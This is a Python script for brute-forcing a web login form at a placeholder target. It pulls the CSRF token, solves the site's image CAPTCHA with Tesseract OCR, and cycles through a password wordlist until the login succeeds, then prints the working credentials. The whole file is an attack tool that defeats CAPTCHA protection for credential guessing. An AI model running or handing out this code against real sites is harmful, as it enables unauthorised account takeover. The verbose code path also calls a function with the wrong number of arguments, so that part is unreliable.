import requests
import sys
from bs4 import BeautifulSoup
import argparse
from io import BytesIO
from urllib.parse import quote_plus as qp
import pytesseract
from PIL import Image
from requests.structures import CaseInsensitiveDict
import re
import json
pytesseract.pytesseract.tesseract_cmd = r'' #local tesseract path here

""" def rescale(im):
	# Assume 72 DPI if we don't know, as this is
	# one of the lowest common DPI values.
	try:
		dpi = im.info['dpi'][0]
	except KeyError:
		dpi = 72

	target_dpi = 300
	factor = target_dpi / dpi

	return ImageOps.scale(im, factor) """



def getToken( request):
	page = request.get("<TARGET>/login")
	

	html_content = page.text
	soup = BeautifulSoup(html_content, features="lxml")
	
	token = soup.find('input', {"name":"_token"}).get("value")
	
	return token

def get_captcha_code(request):
		code = ""
		while True :
			firs = request.get(f"<TARGET>/captcha", verify=False) #captcha path
			data = json.loads(firs.content)
			captcha_url = data.get('captcha', '')
			match = re.search(r'<img src="([^"]+)"', captcha_url)
			captcha_image_url = match.group(1)
			r = request.get(captcha_image_url, verify=False)
			img = Image.open(BytesIO(r.content))
			# make photo b&w
			img=img.resize((700,300)).convert('L')
			thre = img.point(lambda p: p > 180 and 255)
			#thre.show()
			code = pytesseract.image_to_string(thre).strip()
			if len(code) == 5:	
				print(code)
				break  
			else:
				print(code)
		
		return code

def connect(username, password,  captcha, token, message, request):
	login_info = {
		"email": username,
		"password": password,
		"captcha": captcha,
		"_token": token
	}
	
	login_request = request.post("<TARGET>/login", login_info)

	if message not in login_request.text:
		return True

	else:
		return False

def tryLogin(username, password, url, captcha, message, request):
	print("[+] Trying "+username+":"+password+" combination")
	print("[+] Retrieving CSRF token to submit the login form")
	token = getToken(  request)

	print("[+] Login token is : {0}".format(token))

	found = connect(username, password,  captcha, token, message, request)
	
	if (not found):
		print("[-] Wrong credentials")
		return False
	else:
		print("[+] Logged in sucessfully")
		return True

def printSuccess(username, password):
	print("-------------------------------------------------------------")
	print()
	print("[*] Credentials:\t"+username+":"+password)
	print()

def main():
	parser = argparse.ArgumentParser()
	
	
	user_group = parser.add_mutually_exclusive_group(required=True)
	user_group.add_argument('-l', '--username', help='username for bruteforce login')

	#user_group.add_argument('-L', '--usernames', help='usernames worldlist for bruteforce login')
	
	
	pass_group = parser.add_mutually_exclusive_group(required=True)
	pass_group.add_argument('-P', '--passwords', help='passwords wordlist ')


	# error message
	parser.add_argument('-m', '--message', help="Giriş yapamayayınca dönen mesaj:", required=True)

	# verbosity
	parser.add_argument('-v', '--verbosity', action='count', help='verbosity level')

	args = parser.parse_args()

	
	with open(args.passwords, 'rb') as passfile:
			for passwd in passfile.readlines():
				reqSess = requests.session()
				asa = get_captcha_code(request=reqSess)	
				if (args.verbosity != None):
					found = tryLogin(args.username, passwd.decode().strip(), asa, args.message, reqSess)
					print()
				else:
					token = getToken( reqSess)
					found = connect(args.username, passwd.decode().strip(), asa, token, args.message, reqSess)

				if (found):
					printSuccess(args.username, passwd.decode().strip())
					sys.exit(1)
	
	

if __name__ == '__main__':
	main()